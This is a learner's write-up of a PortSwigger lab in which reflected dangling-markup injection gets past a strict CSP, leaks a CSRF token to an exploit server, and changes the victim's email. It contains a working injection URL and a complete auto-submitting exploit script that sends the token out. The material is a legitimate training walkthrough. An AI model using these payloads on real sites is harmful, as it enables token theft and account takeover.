# Reflected XSS protected by very strict CSP, with dangling markup attack — (PortSwigger — Practitioner)
**Date:** 2026-08-22
 
---
 
## Vulnerability / core concept
Reflected XSS

---


## Payload / key command
This web application is protected by a strict CSP. We can see the following header in the responses we get during inspection of the requests:
```bash
Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
```
Now, I have tried to look everywhere how I can create even an attempt of reflected XSS but I could not really find it. After lots of trying I got some help from walkthrough, which made me understand what is going under the hood. 

At first nothing really stands out, except the fact that email update form was validated by CSP. We could not write basic payload there - it simply does not work and to bypass it we need to prepend some valid `babek@email` value before our payload. Even when we do this, application properly escapes our payload. Therefore, we need to do basic recon on endpoints of this application. I used `Param Finder` and it helped me to identify a query parameter (key) `email` on `/my-account?id=` endpoint. I immediately tried to test what happens when we use that key. As a result, the value that we give to that key populates the form of email update form. However, it is not executed because it is protected by CSP (we can see that in the console in developer tools). To exploit this further, we need to bypass that CSP. I used the payload from the write-up as I didn't know it before:
```bash
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
```
This payload does the following:
1) Using valid email before our payload helps us to bypass CSP client-side validation.
2) It creates a button which redirects the user to our malicious server on click. 
3) We are making this button to use GET request so it will append the `csrf` token to the query instead of being hidden in the POST body.

Now, we found that we can bypass the client-side validation and CSP, we can use the following script from portswigger to automate our attack and change the victim's email address:
```html
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://your-lab-url.net/";
const exploitServer = "https://your-exploit-server.net/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```
After pressing on our malicious button, this script will automatically change the victim's email address and will solve this lab.

